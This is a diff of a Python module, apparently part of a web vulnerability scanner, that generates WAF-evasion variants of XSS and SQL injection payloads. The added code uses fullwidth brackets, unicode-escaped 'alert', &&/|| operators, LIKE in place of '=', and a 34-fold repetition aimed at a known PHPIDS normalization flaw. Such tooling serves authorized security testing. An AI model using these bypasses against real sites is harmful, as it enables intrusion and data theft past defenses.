@@ -1,7 +1,9 @@
 """
-XSS / SQLi finding → WAF 우회 변형 task 목록
+XSS / SQLi payload → WAF 우회 변형 목록
 
-진입점: build_mutated_tasks(findings, original_tasks) → List[dict]
+진입점:
+  mutate_payload(payload)       → XSS 변형 목록
+  mutate_sqli_payload(payload)  → SQLi 변형 목록
 """
 
 from __future__ import annotations
@@ -12,20 +14,23 @@ from typing import List
 
 # ── XSS mutations ──────────────────────────────────────────────────────────────
 #
-# ZAP CrossSiteScriptingScanRule.mutateAttack() 기반.
+# ZAP CrossSiteScriptingScanRule.mutateAttack() 기반 + PHPIDS 시그니처 우회 기법.
 #
-# Group 1: ( → `  ) → `   (괄호 차단 WAF 우회)
-# Group 2: < → ＜  > → ＞  (각도 괄호 차단 WAF 우회, 전각문자)
+# Group 1: ( → `  ) → `        (괄호 차단 WAF 우회)
+# Group 2: < → ＜  > → ＞      (각도 괄호 차단 WAF 우회, 전각문자)
 # Group 3: 1+2 동시 적용
+# Group 4: = → \t=\t           (속성 파싱은 공백 허용 → "onerror=" 등 정확매치 시그니처 우회)
+# Group 5: alert( → alert(  (JS 유니코드 이스케이프 — 리터럴 "alert(" 문자열 시그니처 우회, 실행 결과는 동일)
+# Group 6: 1+2+5 동시 적용
 
 _MUTATIONS: List[List[tuple[str, str]]] = [
     [("(", "`"), (")", "`")],
     [("<", "＜"), (">", "＞")],
     [("(", "`"), (")", "`"), ("<", "＜"), (">", "＞")],
+    [("=", "\t=\t")],
+    [("alert(", "\\u0061lert(")],
+    [("alert(", "\\u0061lert("), ("(", "`"), (")", "`"), ("<", "＜"), (">", "＞")],
 ]
-
-_APPLICABLE_CONFIDENCE = {"confirmed", "suspected"}
-
 
 def mutate_payload(payload: str) -> List[dict]:
     """XSS 페이로드 mutation 목록 반환."""
@@ -57,6 +62,11 @@ def mutate_payload(payload: str) -> List[dict]:
 # S2: " -- " → " #"    (MySQL hash comment 우회)
 # S3: 예약어 대소문자 혼용  (AnD, oR, SeLeCt — regex 시그니처 우회)
 # S4: S1 + S3 동시 적용
+# S5: AND/OR → &&/||           (키워드 매칭이 아닌 기호 연산자로 로직 표현 — 키워드 블랙리스트 우회)
+# S6: '=' → ' LIKE '           (PHPIDS는 '=', '(', ''' 세 문자를 핵심 트리거로 사용 — 등호 회피)
+# S7: payload를 SQL 주석으로 종결 후 반복(x34)  (PHPIDS 0.6.5 Converter.php 반복 패턴
+#     정규화 취약점 — exploit-db #17726. 2문자 패턴이 32회+ 반복되면 anti-evasion
+#     전처리 정규식이 무력화됨. DB에는 첫 조각만 유효, 나머지는 주석 처리됨)
 #
 # 제외: SLEEP / pg_sleep / dbms_pipe 등 함수명은 대소문자 혼용 시 DB 미인식 위험
 
@@ -65,6 +75,10 @@ _SQLI_KEYWORD_RE = re.compile(
     r"LIMIT|OFFSET|IN|EXISTS|BETWEEN|LIKE|WAITFOR|DELAY|NULL)\b",
     re.IGNORECASE,
 )
+
+_AND_RE = re.compile(r"\bAND\b", re.IGNORECASE)
+_OR_RE  = re.compile(r"\bOR\b", re.IGNORECASE)
+_EQ_RE  = re.compile(r"\s*=\s*")
 
 
 def _mix_case(word: str) -> str:
@@ -104,78 +118,21 @@ def mutate_sqli_payload(payload: str) -> List[dict]:
         if s4 not in {payload, s1, s3}:
             results.append({"payload": s4, "group": "S4", "description": "space→/**/ + case mix"})
 
+    # S5: AND/OR → &&/||  (기호 연산자 치환)
+    s5 = _OR_RE.sub("||", _AND_RE.sub("&&", payload))
+    if s5 != payload:
+        results.append({"payload": s5, "group": "S5", "description": "AND/OR→&&/|| (기호 연산자)"})
+
+    # S6: '=' → ' LIKE '  (등호 회피)
+    if "=" in payload:
+        s6 = _EQ_RE.sub(" LIKE ", payload)
+        if s6 != payload:
+            results.append({"payload": s6, "group": "S6", "description": "=→LIKE (등호 회피)"})
+
+    # S7: 주석 종결 + 반복(x34)  (PHPIDS Converter 반복패턴 정규화 취약점, exploit-db #17726)
+    terminated = payload if payload.rstrip().endswith(("-- ", "-- -", "#", "/*")) else f"{payload}-- -"
+    s7 = terminated * 34
+    results.append({"payload": s7, "group": "S7", "description": "PHPIDS Converter 반복패턴 우회 (x34)"})
+
     return results
 
-
-# ── 공통 진입점 ────────────────────────────────────────────────────────────────
-
-def build_mutated_tasks(
-    findings: List[dict],
-    original_tasks: List[dict],
-) -> List[dict]:
-    """XSS / SQLi finding → mutation 변형 task 목록.
-
-    - confidence가 confirmed / suspected 인 finding만 대상
-    - original_tasks에서 (url, inject_param, payload) 로 원본 task를 찾아
-      HTTP 컨텍스트를 복사하고 payload만 변형 버전으로 교체
-    """
-    if not findings or not original_tasks:
-        return []
-
-    # (url, inject_param, payload) → task 빠른 조회
-    task_index: dict[tuple, dict] = {}
-    for t in original_tasks:
-        key = (t.get("url"), t.get("inject_param"), t.get("payload"))
-        task_index[key] = t
-
-    out: List[dict] = []
-
-    xss_findings = [
-        f for f in findings
-        if f.get("vuln_type") == "XSS"
-        and f.get("confidence") in _APPLICABLE_CONFIDENCE
-    ]
-    for finding in xss_findings:
-        orig_key = (finding.get("url"), finding.get("param"), finding.get("payload"))
-        orig_task = task_index.get(orig_key)
-        if not orig_task:
-            continue
-        for m in mutate_payload(finding.get("payload") or ""):
-            task = dict(orig_task)
-            task["id"] = f"mut_{orig_task.get('id', 'x')}_xss_g{m['group']}"
-            task["payload"] = m["payload"]
-            task["payload_family"] = f"mutated_xss_g{m['group']}"
-            task["meta"] = {
-                **(orig_task.get("meta") or {}),
-                "mutation_group":      m["group"],
-                "mutation_desc":       m["description"],
-                "original_payload":    finding.get("payload"),
-                "original_confidence": finding.get("confidence"),
-            }
-            out.append(task)
-
-    sqli_findings = [
-        f for f in findings
-        if f.get("vuln_type") == "SQLI"
-        and f.get("confidence") in _APPLICABLE_CONFIDENCE
-    ]
-    for finding in sqli_findings:
-        orig_key = (finding.get("url"), finding.get("param"), finding.get("payload"))
-        orig_task = task_index.get(orig_key)
-        if not orig_task:
-            continue
-        for m in mutate_sqli_payload(finding.get("payload") or ""):
-            task = dict(orig_task)
-            task["id"] = f"mut_{orig_task.get('id', 'x')}_sqli_{m['group']}"
-            task["payload"] = m["payload"]
-            task["payload_family"] = f"mutated_sqli_{m['group']}"
-            task["meta"] = {
-                **(orig_task.get("meta") or {}),
-                "mutation_group":      m["group"],
-                "mutation_desc":       m["description"],
-                "original_payload":    finding.get("payload"),
-                "original_confidence": finding.get("confidence"),
-            }
-            out.append(task)
-
-    return out
